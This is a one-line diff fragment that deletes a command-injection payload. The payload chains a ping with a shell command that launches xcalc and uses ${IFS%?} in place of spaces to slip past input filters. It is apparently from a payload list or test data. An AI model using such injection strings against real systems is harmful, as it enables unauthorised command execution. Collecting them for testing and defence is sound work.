@@ -1,1 +1,0 @@
-ping google.com${IFS%?}-c${IFS%?}1&&sh${IFS%?}-c${IFS%?}xcalc&&ping${IFS%?}google.com
